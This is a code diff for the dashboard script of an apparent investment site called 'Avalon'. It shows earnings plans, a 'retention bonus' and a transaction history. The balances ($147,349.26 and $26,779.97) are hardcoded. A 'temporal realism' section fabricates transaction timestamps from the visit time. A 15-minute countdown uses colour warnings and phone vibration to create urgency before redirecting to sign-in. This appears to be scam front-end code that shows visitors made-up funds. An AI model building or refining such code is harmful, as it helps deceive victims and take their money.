+
         if (!planData) return count;
+
+        // Device binding check
         if (planData.deviceId && planData.deviceId !== currentDeviceId) return count;
-        return (planData.active && now < planData.expiresAt) ? count + 1 : count;
+
+        // Only real paid + not expired
+        const isActive = planData.active && now < planData.expiresAt;
+
+        return isActive ? count + 1 : count;
     }, 0);
+
     const el = document.getElementById('activePlans');
+
+    // instant update (no animation)
     if (el) el.textContent = activeCount;
 }
 
+// ================================
+// 💰 TOTAL ACU (FIXED - NO RESET ON LOCK)
+// ================================
 function updateTotalACU() {
     const now = Date.now();
+
     const total = BASE_ACU + ALL_PLANS.reduce((sum, plan) => {
         const data = getPlan(plan);
         if (!data) return sum;
-        const per12h = plan === "custom" ? ((data.amount || 0) * 1.5) / 2 : plans[plan].per12h;
+
+        const per12h = plan === "custom"
+            ? ((data.amount || 0) * 1.5) / 2
+            : plans[plan].per12h;
+
         const elapsed = now - data.activatedAt;
         const cycles = Math.floor(elapsed / CYCLE_MS);
         const cycleProgress = (elapsed % CYCLE_MS) / CYCLE_MS;
-        return sum + (isLocked(data, now) ? displayedAC[plan] : (cycles * per12h) + (cycleProgress * per12h));
+
+        const liveValue = (cycles * per12h) + (cycleProgress * per12h);
+
+        // 🔥 KEY FIX: freeze value instead of removing it
+        const finalValue = isLocked(data, now)
+            ? displayedAC[plan]
+            : liveValue;
+
+        return sum + finalValue;
     }, 0);
+
     const el = document.getElementById("totalACU");
-    if (el) el.textContent = "$" + total.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    if (el) {
+    el.textContent =
+        "$" + total.toLocaleString(undefined, {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+        });
+}
+
     localStorage.setItem("totalACU", total.toFixed(2));
 }
 
+// ================================
+// 📈 PER PLAN ACU (FIXED)
+// ================================
 function updatePlanACU() {
     const now = Date.now();
+
     ALL_PLANS.forEach(plan => {
         const data = getPlan(plan);
         const el = document.getElementById(plans[plan].ac);
         if (!el || !data) return;
-        const per12h = plan === "custom" ? ((data.amount || 0) * 1.5) / 2 : plans[plan].per12h;
+
+        const per12h = plan === "custom"
+            ? ((data.amount || 0) * 1.5) / 2
+            : plans[plan].per12h;
+
         const elapsed = now - data.activatedAt;
         const cycles = Math.floor(elapsed / CYCLE_MS);
         const cycleProgress = (elapsed % CYCLE_MS) / CYCLE_MS;
+
         const targetAC = (cycles * per12h) + (cycleProgress * per12h);
-        const finalTarget = isLocked(data, now) ? displayedAC[plan] : targetAC;
-        displayedAC[plan] += (finalTarget - displayedAC[plan]) * 0.08;
+
+        // 🔥 KEY FIX: freeze when locked instead of resetting
+        const finalTarget = isLocked(data, now)
+            ? displayedAC[plan]
+            : targetAC;
+
+        const diff = finalTarget - displayedAC[plan];
+        displayedAC[plan] += diff * 0.08;
+
         el.textContent = displayedAC[plan].toFixed(2) + " ACU";
 
+        // cycle animation
         if (cycles > lastCycleCount[plan]) {
             const card = document.getElementById(plan + "Card");
             card?.classList.add("cycle-burst");
-            setTimeout(() => { card?.classList.remove("cycle-burst"); }, 1200);
+
+            setTimeout(() => {
+                card?.classList.remove("cycle-burst");
+            }, 1200);
+
             lastCycleCount[plan] = cycles;
         }
     });
 }
 
-// --- 🆕 CLEAN EVALUATION WITH DYNAMIC WITHDRAWAL LINE RENDERING ---
-let currentWithdrawalState = null; 
-
-function updateRetentionBonus() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const avWithdrawn = localStorage.getItem('av_withdrawn') === 'true' || urlParams.get('av_withdrawn') === 'true';
-    
-    const bonusEl = document.getElementById('retentionBonusAmount');
-    if (avWithdrawn) {
-        if (bonusEl) bonusEl.textContent = "0.00 ACU ~ $0.00";
-    } else {
-        if (bonusEl) bonusEl.textContent = "26,779.97 ACU ~ $26,779.97";
-    }
-
-    if (currentWithdrawalState !== avWithdrawn) {
-        currentWithdrawalState = avWithdrawn;
-        const tbody = document.getElementById("txHistoryTableBody");
-        if (!tbody) return;
-
-        let tableRowsHTML = `
-            <tr>
-                <td>Available Balance</td>
-                <td>${dynamicBalanceTimeStr || 'Calculating...'}</td>
-                <td><span class="tx-status-tag received">Received</span></td>
-                <td style="text-align: right; font-weight: 600; color: #00f2fe;">$147,349.26</td>
-            </tr>
-        `;
-
-        if (avWithdrawn) {
-            tableRowsHTML += `
-                <tr>
-                    <td>Retention Bonus</td>
-                    <td>${dynamicBonusTimeStr || 'Calculating...'}</td>
-                    <td><span class="tx-status-tag received" style="background:rgba(100,116,139,0.15); color:#64748b;">Settled</span></td>
-                    <td style="text-align: right; font-weight: 600; color: #64748b;">$0.00</td>
-                </tr>
-                <tr>
-                    <td>Retention Bonus Withdrawal</td>
-                    <td>${dynamicBonusTimeStr || 'Calculating...'}</td>
-                    <td><span class="tx-status-tag withdrawn">Withdrawn</span></td>
-                    <td style="text-align: right; font-weight: 600; color: #ef4444;">-$26,779.97</td>
-                </tr>
-            `;
-        } else {
-            tableRowsHTML += `
-                <tr>
-                    <td>Retention Bonus</td>
-                    <td>${dynamicBonusTimeStr || 'Calculating...'}</td>
-                    <td><span class="tx-status-tag received">Received</span></td>
-                    <td style="text-align: right; font-weight: 600; color: #a78bfa;">$26,779.97</td>
-                </tr>
-            `;
-        }
-        tbody.innerHTML = tableRowsHTML;
-    }
+// ================================
+// 🔄 MAIN UPDATE
+// ================================
+function updateACU() {
+    updatePlanACU();
+    updateTotalACU();
+    updateActivePlans();
 }
 
-function updateACU() { 
-    updatePlanACU(); 
-    updateTotalACU(); 
-    updateActivePlans(); 
-    updateRetentionBonus(); 
+// ================================
+// 🚀 LOOP
+// ================================
+function animate() {
+    updateACU();
+    requestAnimationFrame(animate);
 }
-
-animate = function() { updateACU(); requestAnimationFrame(animate); }
-window.addEventListener("load", () => { animate(); });
-setInterval(updateACU, 30000); 
 
 window.addEventListener("load", () => {
-    const notification = document.getElementById("dashboardNotification");
-    localStorage.setItem("avalon_logged_in", "true");
-    let firstName = "";
-    const localData = localStorage.getItem("section2Data");
-    if (localData) {
-        try {
-            const savedData = JSON.parse(localData);
-            if (savedData.fullName) {
-                const rawFirstName = savedData.fullName.trim().split(" ")[0];
-                firstName = rawFirstName.charAt(0).toUpperCase() + rawFirstName.slice(1).toLowerCase();
-            }
-        } catch (e) { console.error("Failed to parse registration name metrics."); }
-    }
-    const nameString = firstName ? `, ${firstName}` : "";
-    let message = !localStorage.getItem("avalon_seen_dashboard") ? `Hi there${nameString}` : `Welcome back${nameString}`;
-    notification.textContent = message;
-    notification.classList.add("show");
-    localStorage.setItem("avalon_seen_dashboard", "true");
-
-    let timer;
-    const getState = (remaining) => {
-        if (remaining <= 0) return "expired";
-        if (remaining <= 300) return "red";
-        if (remaining <= 360) return "yellow";
-        if (remaining <= 540) return "hide_mid";
-        if (remaining <= 720) return "show_mid";
-        return "hide_start";
-    };
-
-    const updateCountdown = () => {
-        const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
-        if (!expiryTime) return;
-        const remaining = Math.max(0, Math.floor((expiryTime - Date.now()) / 1000));
-        const state = getState(remaining);
-        notification.classList.remove("warning-yellow", "warning-red");
-        if (state === "yellow") { notification.classList.add("warning-yellow"); if (navigator.vibrate) navigator.vibrate(200); }
-        if (state === "red") { notification.classList.add("warning-red"); if (navigator.vibrate) navigator.vibrate([300, 100, 300]); }
-        
-        if (state === "hide_start") notification.classList.remove("show");
-        else if (state === "show_mid") notification.classList.add("show");
-        else if (state === "hide_mid") notification.classList.remove("show");
-        else notification.classList.add("show");
-
-        const minutes = Math.floor(remaining / 60);
-        const seconds = remaining % 60;
-        notification.textContent = `Session expires in ${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
-    };
-
-    const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
-    const remaining = Math.floor((expiryTime - Date.now()) / 1000);
-    const initialState = getState(remaining);
-    if (initialState === "yellow") notification.classList.add("warning-yellow");
-    if (initialState === "red") notification.classList.add("warning-red");
-    notification.classList.add("show");
-
-    setTimeout(() => { updateCountdown(); timer = setInterval(updateCountdown, 1000); }, 4000);
+    animate();
 });
 
+// ---------- Auto-refresh in case localStorage changes externally ----------
+setInterval(updateACU, 30000); // every 30 seconds
+
+                /* Dashboard Notification */
+
+window.addEventListener("load", () => {
+
+const notification = document.getElementById("dashboardNotification");
+
+// login flag only
+localStorage.setItem("avalon_logged_in", "true");
+
+// --- Extract first name gently ---
+let firstName = "";
+const localData = localStorage.getItem("section2Data");
+
+if (localData) {
+    try {
+        const savedData = JSON.parse(localData);
+        if (savedData.fullName) {
+            const rawFirstName = savedData.fullName.trim().split(" ")[0];
+            firstName = rawFirstName.charAt(0).toUpperCase() + rawFirstName.slice(1).toLowerCase();
+        }
+    } catch (e) {
+        console.error("Failed to parse registration name metrics.");
+    }
+}
+
+const nameString = firstName ? `, ${firstName}` : "";
+let message;
+
+if (!localStorage.getItem("avalon_seen_dashboard")) {
+    message = `Hi there${nameString}`;
+    localStorage.setItem("avalon_seen_dashboard", "true");
+} else {
+    message = `Welcome back${nameString}`;
+}
+
+notification.textContent = message;
+notification.classList.add("show");
+
+let timer;
+
+const getState = (remaining) => {
+    if (remaining <= 0) return "expired";
+
+    // 5–0
+    if (remaining <= 300) return "red";
+
+    // 6–5
+    if (remaining <= 360) return "yellow";
+
+    // 9–6 HIDE
+    if (remaining <= 540) return "hide_mid";
+
+    // 12–9 SHOW
+    if (remaining <= 720) return "show_mid";
+
+    // 15–12 HIDE
+    return "hide_start";
+};
+
+
+const updateCountdown = () => {
+
+const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+if (!expiryTime) return;
+
+const remaining = Math.max(
+    0,
+    Math.floor((expiryTime - Date.now()) / 1000)
+);
+
+const state = getState(remaining);
+
+// 🎨 STATE HANDLING
+notification.classList.remove("warning-yellow", "warning-red");
+
+if (state === "yellow") {
+    notification.classList.add("warning-yellow");
+    if (navigator.vibrate) navigator.vibrate(200);
+}
+
+if (state === "red") {
+    notification.classList.add("warning-red");
+    if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
+}
+
+// 🔁 VISIBILITY RULES (your exact logic)
+if (state === "hide_start") {
+    notification.classList.remove("show"); // 15–12 HIDE
+}
+
+else if (state === "show_mid") {
+    notification.classList.add("show"); // 12–9 SHOW
+}
+
+else if (state === "hide_mid") {
+    notification.classList.remove("show"); // 9–6 HIDE
+}
+
+else {
+    notification.classList.add("show"); // 6–0 SHOW
+}
+
+// 🕒 TEXT DISPLAY
+const minutes = Math.floor(remaining / 60);
+const seconds = remaining % 60;
+
+notification.textContent =
+    `Session expires in ${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
+
+};
+
+// initial render
+const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+const remaining = Math.floor((expiryTime - Date.now()) / 1000);
+
+const initialState = getState(remaining);
+
+if (initialState === "yellow") {
+    notification.classList.add("warning-yellow");
+}
+
+if (initialState === "red") {
+    notification.classList.add("warning-red");
+}
+
+notification.classList.add("show");
+
+setTimeout(() => {
+    updateCountdown();
+    timer = setInterval(updateCountdown, 1000);
+}, 4000);
+
+});
+
+
+/* --------------------------
+AVB ENGINE (DASHBOARD MATCH)
+-------------------------- */
+
 (function avbEngine() {
+
     const urlParams = new URLSearchParams(window.location.search);
-    if ((urlParams.get("session") === "refresh" || urlParams.get("mode") === "init") && !localStorage.getItem("avb_key_used")) {
+    const hasInitParam =
+        urlParams.get("session") === "refresh" ||
+        urlParams.get("mode") === "init";
+
+    const keyAlreadyUsed = localStorage.getItem("avb_key_used");
+
+    if (hasInitParam && !keyAlreadyUsed) {
         localStorage.removeItem("avb_expiry_time");
         localStorage.removeItem("avb_redirected_to_avb");
         localStorage.removeItem("avb_session_state");
+        
         localStorage.setItem("avb_key_used", "true");
     }
+
     if (!localStorage.getItem("avb_expiry_time")) {
-        localStorage.setItem("avb_expiry_time", Date.now() + 15 * 60 * 1000);
+        localStorage.setItem(
+            "avb_expiry_time",
+            Date.now() + 15 * 60 * 1000
+        );
     }
-    let triggered = false, vibRunning = false, vibTimeout;
+
+    let triggered = false;
+    let vibRunning = false;
+    let vibTimeout;
+
     const startVibrationCycle = () => {
-        if (vibRunning) return; vibRunning = true;
-        const loop = () => { if (!vibRunning) return; if (navigator.vibrate) navigator.vibrate([300, 100, 300]); vibTimeout = setTimeout(loop, 15000); };
+        if (vibRunning) return;
+        vibRunning = true;
+
+        const loop = () => {
+            if (!vibRunning) return;
+
+            if (navigator.vibrate) {
+                navigator.vibrate([300, 100, 300]);
+            }
+
+            vibTimeout = setTimeout(loop, 15000);
+        };
+
         loop();
     };
-    const stopVibrationCycle = () => { vibRunning = false; if (vibTimeout) clearTimeout(vibTimeout); if (navigator.vibrate) navigator.vibrate(0); };
-    const check = () => {
-        const remainingSec = Math.floor((parseInt(localStorage.getItem("avb_expiry_time"), 10) - Date.now()) / 1000);
-        if (!triggered && remainingSec <= 360 && remainingSec > 0) { triggered = true; startVibrationCycle(); }
-        if (remainingSec <= 0 || remainingSec > 360) stopVibrationCycle();
+
+    const stopVibrationCycle = () => {
+        vibRunning = false;
+        if (vibTimeout) clearTimeout(vibTimeout);
+        if (navigator.vibrate) navigator.vibrate(0);
     };
-    setInterval(check, 1000);
+
+    const check = () => {
+        const expiryTime = parseInt(
+            localStorage.getItem("avb_expiry_time"),
+            10
+        );
+
+        const remainingSec = Math.floor(
+            (expiryTime - Date.now()) / 1000
+        );
+
+        if (!triggered && remainingSec <= 360 && remainingSec > 0) {
+
+            triggered = true;
+
+            startVibrationCycle();
+
+            console.log("AVB warning triggered with vibration cycle");
+        }
+
+        // optional safety stop if time passes out of range
+        if (remainingSec <= 0 || remainingSec > 360) {
+            stopVibrationCycle();
+        }
+    };
+
+    check();
+    const avbInterval = setInterval(check, 1000);
+
 })();
 
+/* --------------------------
+SESSION GUARD (CLEANED)
+-------------------------- */
+
 (function sessionGuard() {
-    setInterval(() => {
+
+    const check = () => {
         const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
-        if (expiryTime && Date.now() >= expiryTime) {
+
+        if (!expiryTime) return;
+
+        if (Date.now() >= expiryTime) {
+
             localStorage.removeItem("avb_expiry_time");
             localStorage.removeItem("avb_redirected_to_avb");
             localStorage.removeItem("avb_session_state");
-            window.location.href = "https://membership-signup.avalonflow.site/sign-in";
+            // Note: We leave avb_key_used so they can't reuse the same link if they time out again
+
+            window.location.href =
+                "https://membership-signup.avalonflow.site/sign-in";
         }
-    }, 5000);
+    };
+
+    check();
+    guardInterval = setInterval(check, 5000);
+
 })();
 
-const AUTO_LOGOUT_TIME = 60 * 60 * 1000; 
-let logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
-function resetLogoutTimer(){ clearTimeout(logoutTimer); logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME); }
-["mousemove","keydown","scroll","click"].forEach(event => { window.addEventListener(event, resetLogoutTimer); });
+// ==========================================
+// 🕒 TEMPORAL REALISM & HISTORICAL ANCHORS
+// ==========================================
+const visitDate = new Date();
+const formatTxDate = (dateOffsetMs) => {
+    const txDate = new Date(visitDate.getTime() - dateOffsetMs);
+    return txDate.toLocaleDateString('en-US', {
+        month: 'short',
+        day: '2-digit',
+        year: 'numeric'
+    }) + `, ` + txDate.toLocaleTimeString('en-US', {
+        hour: '2-digit',
+        minute: '2-digit',
+        hour12: true
+    });
+};
 
-window.addEventListener("load", () => {
-    window.parent.postMessage({ type: "UPDATE_TITLE", title: "My Dashboard" }, "*");
+const txTimes = {
+    balance: formatTxDate(24 * 60 * 60 * 1000),      // 24 hours ago
+    bonusReceived: formatTxDate(2 * 60 * 60 * 1000), // 2 hours ago
+    bonusWithdrawn: formatTxDate(0)                  // Just now
+};
+
+// ==========================================
+// 🔓 RETENTION BONUS & COLLAPSIBLE HANDLER
+// ==========================================
+function updateRetentionBonusUI() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const isWithdrawn = localStorage.getItem("av_withdrawn") === "true" || urlParams.get("av_withdrawn") === "true";
+    
+    const bonusCardStat = document.querySelector(".stat-card:nth-child(3) .stat");
+    const historyTableBody = document.getElementById("transactionHistoryRows");
+    
+    if (!historyTableBody) return;
+
+    if (isWithdrawn) {
+        // State 2: Redeemed Bonus
+        if (bonusCardStat) {
+            bonusCardStat.textContent = "0.00 ACU ~ $0.00";
+            bonusCardStat.style.animation = "none";
+            bonusCardStat.style.webkitTextFillColor = "#555";
+        }
+        
+        historyTableBody.innerHTML = `
+            <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                <td style="padding: 12px 8px; font-weight: 500;">Core Available Balance Deposit</td>
+                <td style="padding: 12px 8px; color: #8b949e;">${txTimes.balance}</td>
+                <td style="padding: 12px 8px;"><span style="background: rgba(46,160,67,0.15); color: #3fb950; padding: 2px 8px; border-radius: 6px; font-size: 12px;">Completed</span></td>
+                <td style="padding: 12px 8px; text-align: right; color: #3fb950; font-weight: 600;">+$147,349.26</td>
+            </tr>
+            <tr style="border-bottom: 1px solid rgba(255,255,255,0.05); color: #8b949e;">
+                <td style="padding: 12px 8px;">Retention Bonus Allocation</td>
+                <td style="padding: 12px 8px;">${txTimes.bonusReceived}</td>
+                <td style="padding: 12px 8px;"><span style="background: rgba(139,148,158,0.15); color: #8b949e; padding: 2px 8px; border-radius: 6px; font-size: 12px;">Settled</span></td>
+                <td style="padding: 12px 8px; text-align: right; font-weight: 600;">$0.00</td>
+            </tr>
+            <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                <td style="padding: 12px 8px; font-weight: 500;">Retention Bonus Withdrawal</td>
+                <td style="padding: 12px 8px; color: #8b949e;">${txTimes.bonusWithdrawn}</td>
+                <td style="padding: 12px 8px;"><span style="background: rgba(248,81,73,0.15); color: #f85149; padding: 2px 8px; border-radius: 6px; font-size: 12px;">Processing</span></td>
+                <td style="padding: 12px 8px; text-align: right; color: #f85149; font-weight: 600;">-$26,779.97</td>
+            </tr>
+        `;
+    } else {
+        // State 1: Active Bonus
+        if (bonusCardStat) {
+            bonusCardStat.textContent = "26,779.97 ACU ~ $26,779.97";
+        }
+        
+        historyTableBody.innerHTML = `
+            <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                <td style="padding: 12px 8px; font-weight: 500;">Core Available Balance Deposit</td>
+                <td style="padding: 12px 8px; color: #8b949e;">${txTimes.balance}</td>
+                <td style="padding: 12px 8px;"><span style="background: rgba(46,160,67,0.15); color: #3fb950; padding: 2px 8px; border-radius: 6px; font-size: 12px;">Completed</span></td>
+                <td style="padding: 12px 8px; text-align: right; color: #3fb950; font-weight: 600;">+$147,349.26</td>
+            </tr>
+            <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                <td style="padding: 12px 8px; font-weight: 500;">Retention Bonus Allocation</td>
+                <td style="padding: 12px 8px; color: #8b949e;">${txTimes.bonusReceived}</td>
+                <td style="padding: 12px 8px;"><span style="background: rgba(56,139,253,0.15); color: #58a6ff; padding: 2px 8px; border-radius: 6px; font-size: 12px;">Available</span></td>
+                <td style="padding: 12px 8px; text-align: right; color: #58a6ff; font-weight: 600;">+$26,779.97</td>
+            </tr>
+        `;
+    }
+}
+
+// Initialize Collapsible Event Handles
+window.addEventListener("DOMContentLoaded", () => {
+    updateRetentionBonusUI();
+    
+    const toggleBtn = document.getElementById("historyToggle");
+    const wrapper = document.getElementById("historyCollapseWrapper");
+    const caret = document.getElementById("toggleCaret");
+    
+    if (toggleBtn && wrapper && caret) {
+        toggleBtn.addEventListener("click", () => {
+            if (wrapper.style.maxHeight === "0px") {
+                wrapper.style.maxHeight = "500px";
+                caret.style.transform = "rotate(0deg)";
+            } else {
+                wrapper.style.maxHeight = "0px";
+                caret.style.transform = "rotate(-90deg)";
+            }
+        });
+    }
 });
+
+
+        /* ---------- Auto-Logout After 8 Hours of Inactivity ---------- */
+        const AUTO_LOGOUT_TIME = 60 * 60 * 1000; // 1 hour
+        let logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
+
+        function resetLogoutTimer(){
+            clearTimeout(logoutTimer);
+            logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
+        }
+
+        ["mousemove","keydown","scroll","click"].forEach(event => {
+            window.addEventListener(event, resetLogoutTimer);
+        });
+// Remove the listener that fires immediately
+window.addEventListener("load", () => {
+    // Fire this only when the login form is fully rendered
+    window.parent.postMessage({
+        type: "UPDATE_TITLE",
+        title: "My Dashboard" 
+    }, "*");
+});
+
 </script>
 </body>
 </html>
+--></div>
+</body>
+</html>
+
+
